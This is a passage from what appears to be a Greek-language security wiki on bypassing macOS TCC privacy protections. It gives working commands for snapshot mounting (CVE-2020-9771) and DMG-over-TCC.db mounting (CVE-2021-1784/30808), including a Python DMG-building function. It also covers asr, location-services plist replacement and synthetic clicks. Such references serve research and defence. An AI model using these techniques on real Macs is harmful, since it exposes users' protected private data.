/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Μια πιο λεπτομερής εξήγηση μπορεί να βρεθεί [**στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Τοποθέτηση πάνω από το αρχείο TCC

Ακόμα κι αν το αρχείο TCC DB είναι προστατευμένο, ήταν δυνατό να **τοποθετηθεί πάνω στον κατάλογο** ένα νέο αρχείο TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Ελέγξτε τον **πλήρη εκμεταλλευτή** στο [**αρχικό άρθρο**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του δίσκου και την τοποθέτησή του σε άλλη θέση παρακάμπτοντας τις προστασίες TCC.

### Υπηρεσίες τοποθεσίας

Υπάρχει μια τρίτη βάση δεδομένων TCC στο **`/var/db/locationd/clients.plist`** για να υποδεικνύει τους πελάτες που επιτρέπεται να **έχουν πρόσβαση στις υπηρεσίες τοποθεσίας**.\
Ο φάκελος **`/var/db/locationd/` δεν ήταν προστατευμένος από την τοποθέτηση DMG** οπότε ήταν δυνατή η τοποθέτηση του δικού μας plist.

## Μέσω εφαρμογών εκκίνησης

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Μέσω grep

Σε πολλές περιπτώσεις τα αρχεία θα αποθηκεύουν ευαίσθητες πληροφορίες όπως emails, τηλέφωνα, μηνύματα... σε μη προστατευμένες τοποθεσίες (που θεωρούνται ευπάθεια στην Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Συνθετικά Κλικ

Αυτό δεν λειτουργεί πλέον, αλλά το [**έκανε στο παρελθόν**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Άλλος τρόπος χρησιμοποιώντας [**συμβάντα CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Αναφορά

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Τρόποι Παράκαμψης των Μηχανισμών Απορρήτου του macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Νίκη Με Καταπληκτικό Τρόπο Ενάντια στο TCC - 20+ ΝΕΟΙ Τρόποι Παράκαμψης των Μηχανισμών Απορρήτου του MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
